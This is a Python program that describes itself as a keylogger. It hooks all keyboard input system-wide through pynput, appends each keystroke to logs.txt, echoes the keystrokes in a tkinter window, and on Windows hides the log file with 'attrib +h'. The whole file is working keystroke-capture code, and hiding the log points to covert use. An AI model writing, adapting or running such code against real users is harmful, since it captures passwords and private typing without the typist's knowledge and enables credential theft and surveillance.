import tkinter as tk
from pynput import keyboard
import threading
import os

log_file = "logs.txt"

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Live Keystroke Display & Logger")
        self.root.geometry("600x400")

        self.text_display = tk.Text(self.root, wrap=tk.WORD, font=("Consolas", 12))
        self.text_display.pack(expand=True, fill=tk.BOTH)

        # Start the keylogger thread
        self.listener_thread = threading.Thread(target=self.run_keylogger, daemon=True)
        self.listener_thread.start()

        if os.name == "nt":
            os.system(f"attrib +h {log_file}")  # Hide the file on Windows

    def run_keylogger(self):
        def on_press(key):
            try:
                if hasattr(key, 'char') and key.char:
                    self.log_and_display(key.char)
                elif key == keyboard.Key.space:
                    self.log_and_display(" ")
                elif key == keyboard.Key.enter:
                    self.log_and_display("\n")
            except Exception as e:
                print("Key error:", e)

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def log_and_display(self, content):
        # Log to file
        try:
            with open(log_file, "a", encoding='utf-8') as f:
                f.write(content)
        except Exception as e:
            print("Log error:", e)

        # Update GUI safely in the main thread
        self.text_display.after(0, lambda: self.text_display.insert(tk.END, content))
        self.text_display.after(0, lambda: self.text_display.see(tk.END))

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()
